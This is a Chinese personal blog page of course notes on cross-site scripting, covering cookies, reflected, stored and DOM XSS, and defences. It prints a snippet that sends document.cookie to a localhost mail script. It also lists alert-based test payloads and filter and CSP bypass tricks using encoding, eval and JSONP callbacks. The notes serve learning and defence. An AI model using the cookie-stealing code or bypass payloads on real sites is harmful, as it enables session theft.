@@ -1,0 +1,580 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="xnevF7kqEaJI7y45BmO0xpIUVUa0xusjcJ0MIFbvX2I">
+  <meta name="msvalidate.01" content="0E006AA8DCC38A710D0287C1DD04DDCA">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"tianlipa.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="客户端的Cookie: 记录登录状态，跟踪用户行为 服务端的Session JavaScript操作Cookie获取和设置： document.cookie;document.cookie&#x3D;‘name&#x3D;abc’; 无法删除，只能通过更改过期时间删除。 脚本注入网页：XSS(Cross Site Script)&lt;script&gt;alert(1)&lt;&#x2F;script&gt;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="3-XSS渗透与防御">
+<meta property="og:url" content="https://tianlipa.github.io/2025/08/msb-03-xss/index.html">
+<meta property="og:site_name" content="tianlipa">
+<meta property="og:description" content="客户端的Cookie: 记录登录状态，跟踪用户行为 服务端的Session JavaScript操作Cookie获取和设置： document.cookie;document.cookie&#x3D;‘name&#x3D;abc’; 无法删除，只能通过更改过期时间删除。 脚本注入网页：XSS(Cross Site Script)&lt;script&gt;alert(1)&lt;&#x2F;script&gt;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tianlipa.github.io/img/msb/17376208071206.png">
+<meta property="og:image" content="https://tianlipa.github.io/img/msb/17376210736185.png">
+<meta property="og:image" content="https://tianlipa.github.io/img/msb/17376413018599.png">
+<meta property="article:published_time" content="2025-08-13T05:37:07.000Z">
+<meta property="article:modified_time" content="2025-08-13T06:11:42.570Z">
+<meta property="article:author" content="tianlipa">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="马士兵">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tianlipa.github.io/img/msb/17376208071206.png">
+
+<link rel="canonical" href="https://tianlipa.github.io/2025/08/msb-03-xss/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>3-XSS渗透与防御 | tianlipa</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">tianlipa</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+    
+      <!-- <p class="site-subtitle" itemprop="description">Subtitle</p> -->
+
+      <div id="randomParagraph" class="site-subtitle" itemprop="description"></div>
+      <script>
+      var paragraphs = [
+          "AAA全国可飞加我看小男娘",
+          "无糖可乐和有糖的, 相比之下,<br>冰镇可乐, 喝的更痛快.",
+          "前有绝景, 敬请见证.",
+          "再添加一个段落以供随机选择.",
+          "<span style='color: red;'>这句话是红色的.</span>",
+          "My eyes are open.",
+          "Memento Mori.",
+          "we will get out of babbdi",
+          "谁也不会把迷宫的出口告诉小白鼠的, 伦吾同学.",
+          "那些没有天赋的人呢?",
+          "本人今年就30了, 和很多校友一样",
+          "即使引导早已破碎, <br>也请您当上艾尔登之王.",
+          "我考, 完啦",
+          "任何人来打扰我干正事,<br>我都会停下来和他玩",
+          "没有爱可以活下去, 但没有水不行.",
+          "偶洅匜ハモえ菗潒ろ",
+          "多勢に無勢 もう負け犬決定",
+          "再见, 老七",
+          "赌书消得泼茶香,<br>当时只道是寻常.",
+          "欲买桂花同载酒,<br>终不似, 少年游.",
+          "我未成名君未嫁,<br>可能俱是不如人.",
+          "多少事, 从来急;<br>天地转, 光阴迫.<br>一万年太久, 只争朝夕.<br>四海翻腾云水怒, 五洲震荡风雷激.<br>要扫除一切害人虫, 全无敌.",
+          "当烧到一百三十五万时, 水开了.",
+          "啊啊啊啊啊<br>啊啊啊啊啊<br>啊啊啊啊啊<br>啊啊啊啊唉",
+          "I was cured, all right.",
+          "Keep on keeping on.",
+          "Don't be so serious.",
+          "Once there was an explosion",
+          "知君命不偶, 同病亦同忧.",
+          "等闲变却故人心,<br>却道故人心易变.",
+          "欢迎使用华为备忘录. 您可以使用备忘录快速记录所思所想, 创建笔记, 清单以及待办事项.",
+          "一光栅宽5cm, 每1mm有400条刻线, 波长500nm光波正入射时, 第二级衍射谱的衍射角最接近于",
+          "如果你能认出Subtitle里的所有梗可以联系我, 我愿意v你50",
+          "你的电影, 超~~级好看",
+          "骗你的, 我们不去看电影",
+          "95%的可能我们会寄",
+          "我不想吃拼好饭了, 我想被爱",
+          "It's not faith you need.<br>It's fear.",
+          "关注加州消防栓!!!关注加州消防栓!!!关注加州消防栓!!!关注加州消防栓!!!关注加州消防栓!!!关注加州消防栓!!!关注加州消防栓!!!关注加州消防栓!!!关注加州消防栓!!!关注加州消防栓!!!关注加州消防栓!!!关注加州消防栓!!!关注加州消防栓!!!关注加州消防栓!!!关注加州消防栓!!!关注加州消防栓!!!关注加州消防栓!!!关注加州消防栓!!!",
+          "愿您坦然释怀",
+          "永远别放弃!",
+          "愿指引明路的苍蓝星为你闪耀",
+          "&lt;script>alert(1)&lt;/script>",
+          "你终于醒了, 现在是2019年, 我们一起玩MC",
+          "诸位祖先, 敬请见证!",
+          "我只是嘴甜, 我心里没你",
+          "我在跟你说现在的事.",
+          "嘻嘻, 我一定要活下去",
+          "不要害怕,<br>最终我们每个人都会幸福快乐.",
+          "不要在晚上做任何决定.<br>(这条是在凌晨两点写的)",
+          "'or 1=1#",
+          "早知道就活得再任性一点了.",
+          "你好中国!",
+          "事情就是这样.",
+          "叽-啁-叽?",
+          "啊呀呀半夜时钟刚刚敲过,<br>呜呼呼他娘的霉运老跟着我.",
+          "算, 称, 分",
+          "可惜你不写博客, 也不知道这句Subtitle的分量...",
+          "有些人口中的看不见未来其实是看见了未来.",
+          "你知道吗:<br>放坏的香蕉比正常的香蕉更通便.",
+          "征服世界失败, 我被瑞士干掉了.",
+          "太好了, 我逐渐理解一切",
+          "Escape, now",
+          "Subtitle加载失败, 请刷新页面重试.",
+          "幸福就像巧克力,<br>我这种狗一吃就似了.",
+          "逮住蛤蟆, 攥出尿来.",
+          "生活就像海洋, 只有意志坚强的人, 才能到达彼岸.",
+          "<b>活下去</b>",
+          "CAW! CAAAW!",
+          "慢慢地慢慢地像被勒紧脖子一般地<br>把直到昨天的我逐渐杀死",
+          "你尚未连接.<br>Web因你而不同.",
+          "适当地 自由地<br>苟活下去",
+          "@edmundmcmillen You litte F**ker<br>You made a shit of piece with your trash Issac it's f**King Bad this trash game I will become back my money I hope you will in your next time a cow on a trash farm you sucker",
+          "Misery is wasted on the miserable.",
+          "按部就班的发疯",
+          "oiiaiooiiiai",
+          "出售大脑, 全新未使用",
+          "I miss the old days I couldn't tell.",
+          "认清形势, 放弃幻想.",
+          "我能在拥有失忆症的情况下通关地球OL吗",
+          "I said I'm fine!",
+          "永怀初心",
+          "我真的变成坚韧了吗?",
+          "爱的反义词不是恨, 是冷漠.",
+          "哈!",
+          "休息一天, 钓鱼去吧.<br>但愿仍然有鱼可钓.",
+          "广告位招租",
+          "我想了好久要把一句话加进来, 一直拖着没做, 现在忘了是哪句话",
+          "死很容易, 喜剧最难.",
+          "S'all good, man.",
+          "坚持到底并不重要!",
+          "让我们从阳台上看看星星吧",
+          "从前种种, 譬如昨日死;<br>从后种种, 譬如今日生.",
+          "Also try GitLab!"
+      ];
+      var randomIndex = Math.floor(Math.random() * paragraphs.length);
+      var selectedParagraph = paragraphs[randomIndex];
+      document.getElementById('randomParagraph').innerHTML = selectedParagraph;
+      </script>
+    
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://tianlipa.github.io/2025/08/msb-03-xss/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="tianlipa">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="tianlipa">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          3-XSS渗透与防御
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-08-13 13:37:07 / 修改时间：14:11:42" itemprop="dateCreated datePublished" datetime="2025-08-13T13:37:07+08:00">2025-08-13</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>客户端的Cookie: 记录登录状态，跟踪用户行为</p>
+<p>服务端的Session</p>
+<h2 id="JavaScript操作Cookie"><a href="#JavaScript操作Cookie" class="headerlink" title="JavaScript操作Cookie"></a>JavaScript操作Cookie</h2><p>获取和设置：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span>=‘name=abc’;</span><br></pre></td></tr></table></figure>
+<p>无法删除，只能通过更改过期时间删除。</p>
+<h2 id="脚本注入网页：XSS-Cross-Site-Script"><a href="#脚本注入网页：XSS-Cross-Site-Script" class="headerlink" title="脚本注入网页：XSS(Cross Site Script)"></a>脚本注入网页：XSS(Cross Site Script)</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p><img src="/img/msb/17376208071206.png"></p>
+<h3 id="存储型（持久型）XSS"><a href="#存储型（持久型）XSS" class="headerlink" title="存储型（持久型）XSS"></a>存储型（持久型）XSS</h3><p><img src="/img/msb/17376210736185.png"></p>
+<h3 id="实例：获取Cookie发送邮件"><a href="#实例：获取Cookie发送邮件" class="headerlink" title="实例：获取Cookie发送邮件"></a>实例：获取Cookie发送邮件</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(‘img’);</span><br><span class="line">img.<span class="property">width</span> = <span class="number">0</span>;</span><br><span class="line">img.<span class="property">height</span> = <span class="number">0</span>;</span><br><span class="line">img.<span class="property">src</span> = ‘<span class="attr">http</span>:<span class="comment">//localhost/xss/sendmail.php?mycookie=‘+encodeURIComponent(document.cookie); </span></span><br></pre></td></tr></table></figure>
+
+<h2 id="XSS检测和利用"><a href="#XSS检测和利用" class="headerlink" title="XSS检测和利用"></a>XSS检测和利用</h2><h3 id="测试payload"><a href="#测试payload" class="headerlink" title="测试payload"></a>测试payload</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(‘<span class="variable constant_">XSS</span>’)&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&gt;=‘&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">“&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">%3Cscript%3Ealert(<span class="variable language_">document</span>.<span class="property">cookie</span>)%3C/script%3E</span><br><span class="line">&lt;img src=“<span class="attr">javascript</span>:<span class="title function_">alert</span>(‘<span class="variable constant_">XSS</span>’)”&gt;</span><br><span class="line">onerror=“<span class="title function_">alert</span>(‘<span class="variable constant_">XSS</span>’)”&gt;</span><br></pre></td></tr></table></figure>
+
+<p>SVG标签会将XML实体解析后加入标签，eval函数能够接受十六进制的字符串，可用于绕过一些符号过滤。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;svg&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>prompt%#x28;1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span>&lt;/svg&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>.<span class="property">call</span><span class="string">`<span class="subst">$&#123;‘prompt\x281)’&#125;</span>`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<h3 id="自动化检测工具"><a href="#自动化检测工具" class="headerlink" title="自动化检测工具"></a>自动化检测工具</h3><p>XSSER: xsser.03c8.net</p>
+<p>XSSSTRIKE</p>
+<h2 id="XSS防御方法"><a href="#XSS防御方法" class="headerlink" title="XSS防御方法"></a>XSS防御方法</h2><hr>
+<h3 id="反射型XSS-1"><a href="#反射型XSS-1" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>恶意代码未被服务器储存，每次触发漏洞时，都将恶意代码通过GET&#x2F;POST方式提交，用户输入的内容被直接输出在HTML中，然后触发漏洞。</p>
+<p>若注入点在标签内部，则不需要插入标签。例如script标签内部，可以直接插入javascript语句，类似SQL注入，先闭合引号，再注释后面的引号。<br>其他标签内，可以先闭合引号，再插入可以执行javascript代码的属性进行XSS攻击。</p>
+<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>与反射型基本思路相同，都是在后端未对用户输入进行过滤导致的漏洞，但存储型XSS将用户输入保存在数据库或其他的服务器存储中，只要服务保存了XSS代码，便可造成持续性的影响，相比之下更具威胁性。</p>
+<p>在实际环境中，常见于用户发的帖子或个人信息等页面，其他用户访问时便触发XSS。</p>
+<h3 id="DOM-Document-Obect-Model-文档对象模型-型XSS"><a href="#DOM-Document-Obect-Model-文档对象模型-型XSS" class="headerlink" title="DOM(Document Obect Model, 文档对象模型)型XSS"></a>DOM(Document Obect Model, 文档对象模型)型XSS</h3><p>漏洞发生于前端而非后端，前端将用户输入直接写入到了HTML中。Javascript具有操作DOM的功能，可以提取用户的输入，直接插入到DOM中，造成XSS。</p>
+<p>payload与反射&#x2F;存储型相同，如<code>name=&lt;script&gt;alert(‘aminos’)&lt;/script&gt;</code></p>
+<p>注意，只有document.write()函数才会执行script标签内的代码，而通过修改DOM属性innerHTML插入HTML内容不会执行其中script标签内代码，但可以通过插入<code>&lt;img scr=x onerror=alert(1)&gt;</code>的方法执行类似onerror属性中的javascript代码。</p>
+<h2 id="可以用于执行XSS的标签"><a href="#可以用于执行XSS的标签" class="headerlink" title="可以用于执行XSS的标签"></a>可以用于执行XSS的标签</h2><ol>
+<li>几乎所有的标签on事件，如<code>&lt;h1 onmousemove=“alert(1)”&gt;hello&lt;/h1&gt;</code><br>另一个常见的是img标签的onerror属性</li>
+</ol>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=“<span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="number">1</span>)”&gt;&lt;/frame&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">“alert(1)”</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>参考portswigger.net&#x2F;web-security&#x2F;cross-site-scripting&#x2F;cheat-sheet</p>
+<ol start="2">
+<li>HTML5特性的XSS，参考<a target="_blank" rel="noopener" href="http://www.html5sec.org/">www.html5sec.org</a><br>很多标签的on属性需要用户交互才能完成触发，如<code>&lt;input onfocus=‘alert(1)&gt;</code>，输入框获得焦点后才能触发alert(1)<br>但HTML5的autofocus可以自动实现聚焦，让需要交互的XSS变成了无需交互的XSS，降低了成本。</li>
+</ol>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;input onfocus=‘<span class="title function_">alert</span>(<span class="number">1</span>)’ autofocus&gt;</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>javascript伪协议<br>如<code>javascript:void(0)</code>中，”javascript:”表示javascript伪协议，它是由javascript引擎来执行的，如</li>
+</ol>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;a href=“<span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="number">1</span>)”&gt;click here&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>iframe标签也可以使用javascript伪协议，实现自动触发，如</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=“<span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="number">1</span>)”&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>过滤主要有WAF层和代码层，WAF层通常在外部，在主机或网络硬件上对HTTP请求进行过滤拦截，而代码层是在编写web应用的过程中实现对用户输入进行过滤。<br>但javascript语法非常灵活，所以对于普通的正则匹配和字符串比较，很难拦截XSS。</p>
+<ol>
+<li><p>富文本过滤<br>大多数富文本编辑器都允许用户直接编辑HTML，从而引入了XSS漏洞。常见过滤方式是对用户输入的标签进行限制，我们可以寻找黑名单中遗漏的标签。<br>参考portswigger.net&#x2F;web-security&#x2F;cross-site-scripting&#x2F;cheat-sheet<br>如果过滤器本身存在缺陷，如将黑名单替换为空，则可以采用双写绕过。</p>
+</li>
+<li><p>注入点在标签属性中<br>如果没有过滤&lt;和&gt;，可以直接引入新的标签，如果尖括号被过滤，可以插入新的事件属性，如onload, onmousemove。<br>标签的字段支持HTML编码，可以借此绕过一些过滤。如：</p>
+</li>
+</ol>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;img scr=x onerror=“&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x28;&amp;#x31;&amp;#x29;”&gt;</span><br></pre></td></tr></table></figure>
+
+<p>onerror内内容即alert(1)进行HTML编码后的结果。</p>
+<ol start="3">
+<li>注入点在script标签中<br>如果注入点被引号包裹，可以像SQL注入一样，先闭合引号，再用分号结束语句，然后插入代码。<br>如果引号被过滤，且一行存在两个注入点：<br><code>var url=‘http://example.com/?name=&lt;?=$name?&gt;’+’&lt;?=$address?&gt;’</code><br>可以用反斜杠使第一个反引号被转义，从第二个引号开始插入代码：<br><code>var url=‘http://example.com/?name=\‘+’;alert(1);\\</code><br>\是name的值，;alert(1);\是address的值。<br>如果存在单词黑名单，如不允许出现eval等字符，可以用unicode编码绕过。</li>
+</ol>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">\u0065\u0076\u0061\<span class="title function_">u006c</span>(‘<span class="title function_">alert</span>(<span class="number">1</span>)’)</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>CSP过滤及其绕过<br>CSP(Content Security Policy)是一个额外的安全层，用于检测并缓解某些特定类型的注入，包括XSS和数据注入等。<br><img src="/img/msb/17376413018599.png"><br>绕过script-scr ‘self’, self意味着只允许加载同域名目录下的脚本，所以我们可以寻找文件上传或jsonp借口。<br>需要注意的是，如果是图片上传接口，即访问资源时的Content-Type为image&#x2F;png, 浏览器会拒绝将其作为脚本执行。<br>jsonp接口一般采用?callback&#x3D;xxx的方式传参，如<code>xxx(&#123;“result”:”success”&#125;)</code><br>此时若传<code>callback=alert(1);//</code>，就会产生这样的返回：<br><code>alert(1);//(&#123;“result”:”success”&#125;)</code></li>
+</ol>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/web/" rel="tag"># web</a>
+              <a href="/tags/%E9%A9%AC%E5%A3%AB%E5%85%B5/" rel="tag"># 马士兵</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/08/msb-02-sql-injection/" rel="prev" title="2-SQL注入">
+      <i class="fa fa-chevron-left"></i> 2-SQL注入
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2025/08/msb-04-csrf/" rel="next" title="4-CSRF漏洞渗透与防御">
+      4-CSRF漏洞渗透与防御 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">tianlipa</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">61</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/tianlipa" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;tianlipa" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i></a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:tianlipa@qq.com" title="E-Mail → mailto:tianlipa@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i></a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.zhihu.com/people/tianlipa" title="Zhihu → https:&#x2F;&#x2F;www.zhihu.com&#x2F;people&#x2F;tianlipa" rel="noopener" target="_blank"><i class="fab fa-zhihu fa-fw"></i></a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">tianlipa</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
